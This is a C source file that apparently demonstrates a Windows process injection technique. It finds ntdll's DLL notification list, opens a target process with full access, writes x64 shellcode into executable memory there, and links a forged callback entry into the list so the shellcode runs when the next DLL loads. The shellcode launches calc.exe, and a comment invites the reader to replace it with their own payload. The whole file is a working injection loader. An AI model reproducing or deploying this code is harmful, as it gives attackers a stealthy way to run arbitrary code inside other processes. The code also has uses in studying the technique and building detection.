#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "nt.h"



int FindTarget(const char* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    printf("[+] Remote PID: %i\n", pid);
    return pid;
}

// Our dummy callback function
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

// Get LdrpDllNotificationList head address
PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;

    // Get handle of ntdll
    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // find LdrRegisterDllNotification function
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // find LdrUnregisterDllNotification function
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // Register our dummy callback function as a DLL Notification Callback
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: 0x%p\n", head);

            // Unregister our dummy callback function
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

// Print LdrpDllNotificationList of a remote process
void PrintDllNotificationList(HANDLE hProc, LPVOID localHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, localHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = localHeadAddress;
    do {

        // print the addresses of the LDR_DLL_NOTIFICATION_ENTRY and its callback function
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // Get the address of the next callback in the list
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // Read the next callback in the list
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != localHeadAddress); // Stop when we reach the head of the list again

    free(entry);

    printf("\n");
}

// Pop Calc.exe Shellcode from Sektor7
// Please note that this shellcode is not thread safe and is exiting the process upon execution - obviously you should replace it
unsigned char shellcode[276] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 };

int main()
{
    // Get local LdrpDllNotificationList head address
    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] LdrpDllNotificationList head address: 0x%p\n", headAddress);


    // Open handle to remote process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget("dllHook.exe"));
    printf("[+] Got handle to remote process\n");

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, headAddress);

    // Allocate memory for our shellcode in the remote process
    LPVOID shellcodeEx = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory for shellcode in remote process: 0x%p\n", shellcodeEx);

    // Write the shellcode to the remote process
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);

    // Create a new LDR_DLL_NOTIFICATION_ENTRY
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;
    
    // Set the Callback attribute to point to our shellcode
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)shellcodeEx;
    
    // We want our new entry to be the first in the list 
    // so its List.Blink attribute should point to the head of the list
    newEntry.List.Blink = (PLIST_ENTRY)headAddress;

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    // Set the new entry's List.Flink attribute to point to the original first entry in the list
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // Allocate memory for our new entry
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);
    
    // Write our new entry to the remote process
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] Net Entrty has been written to remote process: 0x%p\n", newEntryAddress);

    // Calculate the addresses we need to overwrite with our new entry's address
    // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // Overwrite the previous entry's Flink (head) with our new entry's address
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);

    // Overwrite the next entry's Blink (original 1st entry) with our new entry's address
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, headAddress);

}
